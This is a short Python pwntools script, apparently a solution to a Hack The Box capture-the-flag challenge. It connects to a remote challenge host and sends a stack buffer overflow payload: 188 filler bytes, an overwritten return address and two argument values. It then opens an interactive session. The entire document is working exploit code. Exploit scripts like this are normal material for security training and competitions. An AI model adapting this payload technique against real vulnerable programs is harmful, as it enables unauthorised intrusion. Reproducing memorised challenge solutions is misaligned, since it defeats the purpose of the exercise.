#!/usr/bin/python2

from pwn import *

HOST = 'docker.hackthebox.eu'
PORT = 31846

#if REMOTE:
#    p = process('./vuln')
#else:
p = remote(HOST, PORT)

payload = 'A'*188
payload += p32(0x080491e2)
payload += p32(0x00000000)
payload += p32(0xdeadbeef)
payload += p32(0xc0ded00d)

p.recvline()
p.sendline(payload)
p.interactive()

